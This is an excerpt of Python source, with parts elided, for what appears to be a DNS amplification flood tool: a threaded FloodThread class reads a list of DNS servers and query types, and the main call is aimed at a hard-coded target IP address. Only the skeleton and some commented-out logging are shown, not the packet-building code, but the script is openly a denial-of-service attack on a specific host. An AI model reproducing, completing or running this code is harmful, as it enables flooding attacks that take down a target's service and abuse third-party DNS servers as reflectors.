...
class FloodThread(threading.Thread):
    # def __init__(self, thread_ID, name, dns_server = read_servers()[0], target = '188.214.128.77'):
    def __init__(self, thread_ID, name, dns_server, target):
        threading.Thread.__init__(self)
        self.thread_ID = thread_ID
        self.name = name
        self.dns_server = dns_server # stroka vsego spiska
        self.target = target
        self.flag = True
    ...
    def dns_query(self):
        ...
        #     + ' (IP: ' + str(self.dns_server[1]) 
        #     + ' Port: ' + str(source_port) 
        #     + ' Query type: ' + str(self.dns_server[3]) 
        #     + ' Query: ' + str(self.dns_server[2]) + ')' 
        #     + '\n')
...
main(read_servers(),'188.214.128.77')
